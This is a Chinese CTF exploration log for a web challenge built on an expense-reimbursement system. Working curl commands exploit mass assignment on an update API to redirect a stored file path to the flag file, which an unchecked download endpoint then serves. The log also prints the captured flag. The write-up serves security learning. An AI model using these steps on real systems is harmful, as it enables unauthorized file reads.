# a-08 · 探索记录

对应题解：[`a-08.md`](./a-08.md)。

## 目标与起点

题面：「电子报销系统，研发称没有漏洞，请验证。flag 位于 `/challenge/flag.txt`。」困难，500 分。

`Apache/2.4.65` + `PHP/8.1.34`，首页是统一认证（`action=register|login`）。

## 第一阶段：注册登录

表单只有 `action`、`username`、`password`：

```bash
curl -c cj -X POST -d 'action=register&username=u8&password=pass1234' http://$T/
curl -c cj -b cj -X POST -d 'action=login&username=u8&password=pass1234' http://$T/
# 302 → dashboard.php
```

## 第二阶段：读 dashboard 的内联 JS（关键）

`dashboard.php` 12KB，功能是报销单列表 + 新建 + 「完善草稿（Fast Edit）」。内联脚本里有三个接口和一个隐藏字段的注释：

```js
fetch('api/list_tickets.php')
fetch('api/create_ticket.php')          // multipart，receipt 文件
fetch('api/get_ticket.php?id=' + id)
fetch('api/update_ticket.php?id=' + id) // 增量更新，支持文件
```

以及：

```js
// 此时攻击者如果按 F12 抓包查看 get_ticket 的响应，就会发现
// "receipt_path": "/var/www/html/uploads/xxxxx.jpg"
// 从而意识到有个系统字段叫做 receipt_path
```

同一份 JS 里还有：

```js
// Fake autocompletion to simulate Rabbit Hole 1 (SQLi)
fetch('api/suggest_category.php?q=' + ...)
```

**作者把两条路都写清楚了：`suggest_category.php` 是假 SQLi 诱饵，真正的点在 `receipt_path`。**

## 第三阶段：验证字段可写

创建一张报销单：

```bash
curl -b cj -X POST -F 'title=t1' -F 'amount=1' -F 'description=d' \
  -F 'receipt=@r.txt;type=image/jpeg;filename=r.jpg' \
  http://$T/api/create_ticket.php
# {"status":"success","ticket_id":"2"}
```

`list_tickets.php` 返回：

```json
{"id":2,"user_id":2,"title":"t1","amount":1,"description":"d",
 "receipt_path":"/var/www/html/uploads/ad28...jpg","status":"draft"}
```

`receipt_path` 确实在响应里，且前端新建表单从没提交过它。

再用 `update_ticket.php` 多带一个 `receipt_path`：

```bash
curl -b cj -X POST -F 'title=t1' -F 'amount=1' -F 'receipt_path=/challenge/flag.txt' \
  http://$T/api/update_ticket.php?id=2
# {"status":"success","msg":"Draft updated successfully."}
```

`get_ticket.php?id=2` 确认已改：

```json
"receipt_path":"/challenge/flag.txt"
```

## 第四阶段：下载

```bash
curl -b cj 'http://$T/download.php?id=2'
# flag{ab5c090a-d4db-45be-8b29-5e2914ef10de}
```

`download.php` 直接按 `receipt_path` 读文件，没有 `basename`、没有目录限制。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `api/suggest_category.php?q=` SQLi | 未深入 | JS 注释明写 `Fake autocompletion to simulate Rabbit Hole 1 (SQLi)` |
| 直接下载 `download.php?id=2`（未改路径） | 返回上传的 demo 文件 | 说明下载读 `receipt_path` |
| 前端表单字段 | 只有 title/amount/description/receipt | 无法直接改路径 |
| **`update_ticket.php` 多传 `receipt_path`** | **写入成功** | 增量更新不校验字段名 |
| `download.php` 读改后的路径 | flag | 无路径限制 |

## 这次真正的收获

1. **「增量更新」接口先看有没有 mass assignment。** 判断方法：`get` 响应里出现前端表单没提交的字段（本例 `receipt_path`），就说明该字段可写且会被下游使用。
2. **响应字段就是攻击面的目录。** 看到路径类字段，立刻找它的消费方（下载、预览、导出）——通常都没有二次校验。
3. **注释里的 `Rabbit Hole` 是作者明示的诱饵。** 不要在假 SQLi 上消耗时间。
4. **题面给了 flag 路径时，优先找文件读。** 改一个数据库里的路径字段，比拿 RCE 便宜一个数量级。
5. **注册/登录放同一个 `action` 参数里**是这类题常见的简写，先试 `action=register` 再试其他名字，比暴力扫接口快。
